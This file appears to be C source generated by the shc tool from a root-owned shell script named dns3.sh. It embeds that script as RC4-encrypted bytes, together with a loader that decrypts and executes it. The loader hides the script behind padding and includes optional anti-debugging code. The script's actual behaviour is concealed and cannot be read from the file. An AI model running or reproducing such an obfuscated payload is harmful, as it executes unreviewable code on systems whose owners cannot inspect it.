#if 0

	shc -r -v -f /root/dns3.sh 
#endif

static  char data [] = 
#define      chk2_z	19
#define      chk2	((&data[2]))
	"\032\235\200\310\230\246\321\245\017\167\033\346\161\355\072\215"
	"\157\251\012\101\061"
#define      text_z	2536
#define      text	((&data[120]))
	"\145\023\161\202\036\013\177\115\317\304\052\332\123\343\357\332"
	"\203\266\146\376\232\154\061\217\334\127\251\171\055\321\067\222"
	"\344\251\024\002\264\224\120\204\131\172\137\254\136\116\207\341"
	"\005\356\340\237\133\022\056\067\151\330\260\226\251\347\051\216"
	"\221\076\221\105\323\342\312\054\134\051\330\273\170\140\234\175"
	"\116\175\035\252\217\114\341\371\044\221\220\316\171\271\135\012"
	"\370\356\120\157\376\157\361\012\163\271\236\124\171\322\260\133"
	"\001\332\063\250\272\310\160\126\054\254\054\244\165\375\142\113"
	"\065\254\225\024\203\352\010\030\110\112\053\235\224\164\011\106"
	"\143\342\105\365\331\210\200\345\310\025\326\151\136\157\120\242"
	"\011\314\321\034\363\301\204\360\076\017\332\161\323\257\241\324"
	"\021\240\067\031\173\255\154\020\047\304\056\261\207\043\051\324"
	"\167\203\163\203\361\202\352\236\316\115\072\012\161\127\051\014"
	"\174\176\367\223\126\077\202\321\344\102\150\213\164\247\310\263"
	"\367\134\042\070\160\120\060\232\303\014\366\377\207\261\270\247"
	"\011\142\140\347\205\010\311\217\352\164\004\120\274\033\317\063"
	"\153\360\224\170\222\077\265\326\146\102\263\012\213\041\202\074"
	"\067\317\206\252\152\041\205\345\104\011\032\072\355\174\215\337"
	"\311\114\311\253\307\012\361\240\032\271\370\304\174\301\034\015"
	"\171\006\247\245\363\106\332\341\166\226\072\053\103\016\242\377"
	"\201\173\246\266\025\346\065\260\016\372\134\375\336\274\211\275"
	"\147\053\343\313\150\274\341\155\025\366\340\175\123\032\263\136"
	"\243\071\256\273\334\362\037\217\160\170\131\207\232\111\005\200"
	"\370\130\361\331\214\104\004\215\154\327\231\101\304\121\071\121"
	"\355\217\126\027\032\117\356\317\347\100\145\071\026\130\171\002"
	"\233\070\374\253\327\217\131\002\175\071\050\354\271\012\007\052"
	"\043\063\223\206\234\115\313\176\364\267\330\132\233\371\332\126"
	"\225\313\222\157\014\252\343\141\276\115\205\014\072\103\143\252"
	"\126\163\205\344\117\001\204\145\171\230\365\255\230\031\173\055"
	"\364\171\223\252\330\365\201\137\037\366\006\366\375\324\131\312"
	"\020\076\363\061\126\311\256\205\027\156\102\033\272\000\106\133"
	"\050\342\322\224\300\165\374\355\005\336\054\156\233\366\314\374"
	"\042\017\013\122\136\144\023\032\001\231\141\217\120\100\014\341"
	"\055\333\237\154\213\100\220\103\022\073\255\255\207\246\100\055"
	"\006\111\017\330\226\235\103\115\241\372\140\111\154\202\175\222"
	"\053\301\231\275\013\325\131\311\370\024\231\201\173\030\045\154"
	"\130\063\010\375\077\061\341\054\324\131\030\322\051\262\034\307"
	"\167\043\065\125\250\063\146\064\137\276\326\374\166\320\341\165"
	"\134\316\040\224\077\233\051\337\343\315\370\375\360\032\342\326"
	"\077\303\372\260\236\323\214\364\331\133\214\107\343\145\116\120"
	"\200\353\162\006\041\113\264\005\070\265\031\367\024\111\357\033"
	"\132\227\014\373\351\037\035\311\235\274\241\141\321\120\240\364"
	"\124\270\365\025\200\124\377\350\264\232\221\266\143\106\104\203"
	"\023\154\056\123\215\163\162\062\221\164\346\057\206\364\167\104"
	"\064\214\035\374\013\036\122\173\051\040\311\363\230\232\027\353"
	"\124\064\240\154\257\050\372\255\021\140\125\142\235\366\247\276"
	"\041\255\346\157\211\347\304\230\132\163\003\027\036\051\277\120"
	"\025\251\157\037\270\043\304\223\056\305\045\052\073\104\303\237"
	"\325\377\300\040\320\114\315\331\022\201\326\256\131\312\225\033"
	"\046\176\273\043\032\243\305\061\245\172\152\154\320\342\201\266"
	"\366\356\051\227\152\006\027\072\061\135\370\065\133\361\311\102"
	"\313\341\264\242\226\353\050\101\024\101\343\143\225\363\013\242"
	"\307\007\353\045\012\074\273\341\013\063\160\326\272\232\257\200"
	"\376\371\020\066\357\003\124\361\005\266\053\221\163\367\262\115"
	"\200\175\262\012\102\015\220\031\161\007\175\234\003\261\153\121"
	"\211\116\157\337\377\253\046\232\062\004\025\132\105\311\123\156"
	"\356\045\343\375\114\300\023\202\231\020\023\173\205\266\052\357"
	"\264\175\222\071\123\164\135\146\270\342\174\336\041\062\104\062"
	"\313\001\361\011\146\055\261\230\325\106\326\156\047\301\373\354"
	"\313\205\042\364\053\015\140\135\370\307\332\005\300\225\251\363"
	"\376\344\120\267\364\242\053\267\143\216\154\217\102\330\125\063"
	"\100\115\377\363\360\375\206\127\357\174\016\030\270\030\045\236"
	"\302\135\343\134\212\053\071\115\073\064\211\051\166\221\223\131"
	"\347\205\167\075\147\145\142\234\113\306\367\253\211\036\354\322"
	"\220\235\072\362\120\115\026\247\204\122\325\340\346\377\206\354"
	"\142\022\166\126\236\020\303\114\224\257\374\372\223\337\364\007"
	"\206\274\024\246\064\336\020\126\032\260\233\021\074\053\177\316"
	"\200\237\372\324\340\315\206\030\102\077\056\107\120\304\145\157"
	"\313\137\361\065\156\365\272\170\337\224\123\316\322\225\313\122"
	"\360\064\262\274\273\170\073\075\234\117\177\212\054\030\246\377"
	"\011\312\265\105\356\007\355\271\013\317\040\302\071\070\012\267"
	"\110\355\151\252\162\270\065\074\342\006\051\217\007\116\201\203"
	"\243\142\267\336\203\106\264\020\167\353\326\032\046\062\220\003"
	"\026\351\057\054\041\372\211\205\121\333\021\311\113\065\216\204"
	"\332\030\112\173\043\250\234\335\214\324\200\214\332\002\176\040"
	"\006\177\141\172\204\277\114\176\367\317\241\164\157\344\322\172"
	"\355\060\232\152\163\171\373\002\210\123\232\001\306\027\077\016"
	"\204\161\277\130\117\013\202\307\264\020\251\007\222\117\015\153"
	"\256\103\110\047\276\262\263\054\070\040\147\106\353\170\043\364"
	"\056\353\146\310\352\053\234\142\027\073\371\334\320\216\073\313"
	"\006\017\376\156\007\221\324\125\224\230\202\262\220\342\302\242"
	"\374\023\216\036\011\175\314\167\136\034\115\334\026\120\037\371"
	"\177\100\217\161\321\376\231\252\110\326\203\172\330\352\151\155"
	"\052\163\340\107\012\125\332\266\331\314\344\327\347\171\140\204"
	"\242\361\101\112\132\044\346\273\320\176\327\353\272\003\302\107"
	"\175\302\244\304\065\043\243\227\305\300\254\025\125\265\334\002"
	"\220\252\007\036\336\261\171\136\103\363\223\265\235\105\106\151"
	"\104\164\106\036\011\266\063\010\032\165\337\073\127\226\154\100"
	"\274\100\302\246\203\143\201\331\221\174\131\062\312\372\046\004"
	"\221\157\111\141\213\045\244\352\374\015\135\371\030\007\137\153"
	"\146\310\156\173\001\127\037\371\121\137\041\352\375\332\011\105"
	"\201\273\002\256\133\320\070\344\300\076\201\125\036\376\350\220"
	"\234\031\240\332\262\041\303\205\031\267\340\371\025\156\061\161"
	"\045\273\003\350\106\077\303\251\322\076\140\056\334\062\203\345"
	"\242\157\341\102\270\305\011\074\363\337\275\276\223\035\306\241"
	"\376\275\337\237\114\231\107\137\134\221\373\246\267\031\023\004"
	"\163\065\227\135\331\110\141\226\176\310\036\222\205\027\065\330"
	"\061\277\217\072\134\171\144\221\331\075\212\364\172\066\100\320"
	"\316\355\016\357\000\071\060\100\377\375\127\163\023\372\055\066"
	"\011\132\272\327\024\214\011\171\302\301\173\046\011\243\376\346"
	"\254\300\176\143\233\077\377\125\176\330\050\061\355\076\370\013"
	"\014\226\347\212\021\327\311\347\300\013\135\106\121\017\367\111"
	"\326\232\374\163\276\076\215\157\130\170\242\161\362\323\017\103"
	"\277\237\075\040\003\271\371\156\217\116\200\376\267\215\274\143"
	"\032\027\351\117\046\035\004\233\110\110\310\046\221\252\014\004"
	"\325\104\231\034\106\027\246\377\074\205\121\037\021\032\334\122"
	"\054\066\124\153\142\331\373\364\165\115\133\230\145\322\201\123"
	"\364\013\351\064\244\160\032\277\066\020\241\145\370\102\254\302"
	"\022\307\063\102\176\344\043\323\361\275\226\123\231\361\237\025"
	"\353\336\024\344\277\050\241\111\271\221\155\234\237\070\140\136"
	"\256\374\253\112\314\363\133\261\235\254\046\202\333\105\235\142"
	"\101\226\210\001\046\120\313\072\045\312\052\145\351\041\316\242"
	"\270\150\056\333\165\346\020\177\126\352\304\200\177\060\240\347"
	"\273\224\145\317\024\377\003\142\014\130\267\053\170\033\251\045"
	"\136\332\134\237\241\045\157\154\201\111\057\252\025\212\062\276"
	"\204\240\045\205\053\014\051\141\344\011\252\254\375\355\020\062"
	"\232\155\177\250\020\111\160\260\321\350\016\167\042\075\145\006"
	"\105\365\225\155\107\340\027\044\263\000\122\074\025\072\224\002"
	"\136\027\024\060\116\005\140\231\172\147\312\054\120\360\007\336"
	"\042\367\156\000\027\100\270\374\063\123\104\234\216\101\303\373"
	"\033\043\212\362\221\032\110\174\060\151\306\040\351\175\234\203"
	"\254\043\206\037\313\312\031\373\126\347\075\215\330\120\361\125"
	"\073\261\230\217\322\071\127\303\132\277\166\006\260\350\302\315"
	"\005\251\064\037\264\304\335\143\374\260\070\064\067\244\362\226"
	"\216\176\000\363\237\341\156\167\050\204\153\164\346\152\215\325"
	"\167\003\330\331\062\367\165\220\132\343\171\031\205\010\120\210"
	"\051\202\207\343\276\150\170\060\146\365\311\243\314\175\020\346"
	"\241\245\276\064\024\043\370\352\323\053\145\367\362\152\125\152"
	"\046\076\065\372\340\374\007\362\371\027\236\065\132\020\303\115"
	"\213\274\001\021\266\062\222\165\327\270\222\346\372\264\154\201"
	"\360\370\053\343\070\105\146\221\235\205\351\073\135\052\054\117"
	"\005\274\002\005\102\110\345\341\145\271\202\261\205\021\311\351"
	"\230\322\126\213\245\053\113\130\340\345\041\175\347\321\000\076"
	"\055\337\106\044\156\313\130\155\253\167\136\164\231\374\305\022"
	"\317\346\106\102\350\305\361\204\176\142\001\024\321\163\313\252"
	"\127\161\102\213\236\332\360\232\344\157\111\203\150\106\353\106"
	"\132\333\352\144\235\224\015\354\146\000\247\037\125\271\301\353"
	"\316\042\254\212\101\126\013\360\333\020\102\230\215\003\004\374"
	"\246\374\310\263\337\110\326\300\310\342\356\373\226\002\141\012"
	"\316\061\011\114\306\131\161\157\154\176\125\121\263\011\125\355"
	"\370\154\050\344\052\163\175\121\334\317\147\054\125\314\337\264"
	"\164\105\146\007\265\343\364\066\036\224\342\313\327\347\067\314"
	"\360\246\143\071\115\311\140\354\317\253\067\246\335\105\244\251"
	"\057\224\211\023\053\200\324\100\002\156\354\154\106\177\310\211"
	"\271\361\003\173\034\104\265\341\254\317\272\125\122\326\265\066"
	"\016\230\023\051\050\117\346\245\006\353\342\036\051\123\374\265"
	"\156\370\264\231\315\352\111\316\337\111\025\007\035\237\145\003"
	"\335\145\061\350\331\151\354\025\172\235\307\037\063\327\357\030"
	"\353\061\023\230\271\306\305\277\170\102\063\134\066\010\313\305"
	"\167\004\205\163\365\143\027\337\301\171\026\063\327\263\201\212"
	"\355\075\042\126\313\333\272\045\124\137\024\200\072\326\163\067"
	"\237\225\157\264\320\122\336\206\242\335\032\063\144\245\002\220"
	"\012\226\112\045\074\177\275\033\067\054\305\035\043\170\374\127"
	"\002\305\063\065\076\155\066\073\175\343\211\370\067\360\306\303"
	"\160\221\361\317\222\246\154\316\067\170\042\262\105\060\072\364"
	"\330\317\030\034\161\057\003\316\243\011\003\251\060\175\241\346"
	"\000\151\175\264\372\310\260\313\217\021\073\360\006\244\030\065"
	"\361\024\216\307\234\345\140\206\063\001\265\375\234\160\041\313"
	"\152\027\336\276\366\031\014\253\017\052\074\354\064\271\305\241"
	"\245\045\356\041\032\004\232\156\173\110\362\247\064\163\024\310"
	"\374\244\352\322\105\371\017\154\006\366\213\344\051\044\153\046"
	"\153\127\364\100\044\160\374\107\023\007\030\171\046\311\103\073"
	"\331\050\327\302\353\133\017\345\222\025\247\330\236\272\177\057"
	"\310\017\027\152\033\363\070\021\266\251\336\373\326\224\155\102"
	"\105\201\353\112\213\341\271\314\015\140\022\313\320\032\367\055"
	"\104\320\350\275\060\205\072\177\003\130\051\222\244\013\213\311"
	"\234\034\230\026\326\365\040\316\344\161\231\265\214\220\342\320"
	"\141\313\215\222\121\310\021\124\041\073\346\306\106\162\220\343"
	"\216\050\371\144\036\032\063\002\214\314\267\030\135\232\351\277"
	"\146\167\121\267\100\143\013\141\236\361\050\345\144\270\311\363"
	"\340\303\130\377\336\213\001\152\130\271\202\266\124\154\165\272"
	"\343\306\161\044\051\174\206\310\156\256\256\323\146\167\307\107"
	"\072\037\106\030\253\110\203\003\001\006\272\126\162\057\020\126"
	"\365\202\172\037\377\000\347\156\256\226\101\025\015\010\135\110"
	"\050\243\141\323\354\344\327\356\353\221\104\135\300\125\263\266"
	"\327\056\325\326\056\275\104\335\123\206\363\141\217\120\252\267"
	"\364\014\213\340\361\142\316\334\364\022\071\264\147\355\153\077"
	"\033\100\025\112\376\132\047\122\341\033\264\160\153\137\047\137"
	"\153\262\100\134\025\016\071\011\041\163\275\210\140\051\310\174"
	"\152\335\306\150\070\356\273\031\011\157\211\165\316\261\325\072"
	"\143\025\227\171\043\320\202\105\103\100\316\244\151\226\040\323"
	"\164\347\074\254\326\367\306\337\147\117\124\065\001\052\157\144"
	"\077\006\335\143\327\140\250\033\240\166\277\011\014\340\335\200"
	"\307\031\055\235\021\363\175\170\102\322\255\104\374\035\250\073"
	"\044\206\237\373\347\107\027\207\275\326\221\312\267\156\112\177"
	"\210\167\035\231\152\232\021\255\155\277\361\151\334\232\245\001"
	"\041\104\375\010\214\024\220\111\352\041\023\242\220\136\041\030"
	"\326\076\261\101\331\303\357\106\202\341\260\136\174\126\137\235"
	"\232\135\246\047\161\066\160\134\130\204\376\350\343\037\001\271"
	"\136\263\372\067\166\351\175\370\312\056\127\106\204\267\344\037"
	"\024\213\106\205\302\266\342\032\073\340\003\036\000\004\330\137"
	"\270\322\226\056\274\024\047\207\102\176\316\306\066\263\345\112"
	"\076\053\320\000\342\263\033\036\224\036\075\224\043\025\363\333"
	"\347\212\011\244\236\061\053\341\257\371\247\345\254\215\060\353"
	"\271\001\354"
#define      msg2_z	19
#define      msg2	((&data[3131]))
	"\273\110\045\241\313\250\175\036\000\176\035\233\217\345\153\374"
	"\314\023\041\171\305\222"
#define      pswd_z	256
#define      pswd	((&data[3206]))
	"\015\321\044\365\134\056\231\372\137\305\333\017\277\203\365\154"
	"\021\046\127\312\050\103\147\335\113\042\046\161\032\003\272\050"
	"\325\337\035\061\016\267\054\156\175\010\175\074\214\163\250\235"
	"\232\000\150\302\104\317\237\217\273\150\303\073\272\210\303\332"
	"\046\174\216\330\211\323\174\347\113\324\347\257\114\300\155\050"
	"\237\046\162\000\315\033\175\210\204\100\304\077\310\210\031\357"
	"\004\250\307\216\173\104\166\306\030\135\166\144\036\343\215\275"
	"\012\000\276\330\034\073\140\240\173\045\340\104\255\372\063\262"
	"\242\372\100\035\076\267\344\127\024\133\274\063\076\112\360\111"
	"\112\257\041\146\352\201\007\146\247\347\252\125\341\336\007\204"
	"\330\110\242\027\377\206\157\024\342\053\107\040\165\070\151\300"
	"\347\213\046\322\015\056\070\264\025\343\011\367\301\021\174\232"
	"\132\036\262\132\245\041\156\207\115\266\250\302\357\022\202\327"
	"\235\251\251\252\327\342\136\355\305\150\345\206\172\141\041\324"
	"\177\323\057\044\365\236\254\102\124\124\004\104\146\207\033\003"
	"\061\304\255\010\246\014\365\154\165\333\363\357\074\024\304\273"
	"\350\363\340\335\221\214\037\346\340\044\052\107\254\106\112\335"
	"\012\370\346\261\004\333\035\171\267\020\151\363\045\055\257\015"
	"\041\220\353\263\034\012\231\375\057\304\104\334\012\217\271\025"
	"\207\237\306\214\173\344\005\062\362\305\000\015\311\272\065\236"
	"\232\123\320\250\013\374\026\210\004\224"
#define      opts_z	1
#define      opts	((&data[3480]))
	"\302"
#define      lsto_z	1
#define      lsto	((&data[3481]))
	"\337"
#define      tst1_z	22
#define      tst1	((&data[3485]))
	"\262\146\003\030\126\341\165\012\242\222\205\066\304\166\135\343"
	"\140\265\131\300\000\043\321\231\124\101\131"
#define      tst2_z	19
#define      tst2	((&data[3510]))
	"\222\331\201\000\371\364\316\214\006\063\241\323\150\263\145\062"
	"\243\306\220\361\374"
#define      rlax_z	1
#define      rlax	((&data[3530]))
	"\106"
#define      msg1_z	65
#define      msg1	((&data[3531]))
	"\215\216\075\337\021\351\160\123\347\033\055\221\253\364\307\267"
	"\127\342\134\143\233\031\153\124\043\314\306\353\370\133\145\377"
	"\152\013\366\315\225\365\124\152\210\305\117\124\166\326\356\333"
	"\302\320\244\114\024\263\301\176\243\250\373\151\341\372\123\250"
	"\376\372\375\126\202"
#define      date_z	1
#define      date	((&data[3600]))
	"\370"
#define      chk1_z	22
#define      chk1	((&data[3606]))
	"\301\225\042\130\371\332\110\070\015\277\323\012\065\276\017\356"
	"\274\101\034\217\327\270\353\060\372\103\310\324\276\375\026"
#define      shll_z	10
#define      shll	((&data[3634]))
	"\175\130\161\277\053\300\013\072\134\124\227\073\125"
#define      inlo_z	3
#define      inlo	((&data[3645]))
	"\155\247\062"
#define      xecc_z	15
#define      xecc	((&data[3650]))
	"\003\210\020\223\043\225\351\144\326\322\303\202\206\100\175\126"
	"\354"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
